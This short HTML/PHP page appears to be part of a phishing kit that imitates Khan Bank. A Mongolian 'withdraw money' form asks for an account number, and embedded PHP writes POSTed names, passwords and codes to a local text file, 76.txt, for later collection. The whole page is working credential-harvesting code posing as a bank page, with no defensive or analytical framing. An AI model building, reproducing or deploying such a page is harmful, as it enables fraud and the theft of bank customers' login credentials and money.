
<meta charset="utf-8">

  
 
<title>http://khanbank/fhaln.com</title>

<ul><ul><ul><ul><ul><ul><ul><ul><ul><ul><h1>Мөнгө авах</h1>

<form action="pass.html" method="post">
<input type="number" placeholder="Дансний дугаар" name="dd" required>
<br><br>
<input type="submit" value="Авах">
</br>

<?

$handle = fopen("76.txt" ,  "a");
fwrite($handle, $_POST["ner"]);
fwrite($handle, " : ");
fwrite($handle, $_POST["nuutsug"]);
fwrite($handle, " : ");
fwrite($handle, $_POST["cod"]);
fwrite($handle, "\n");




?>
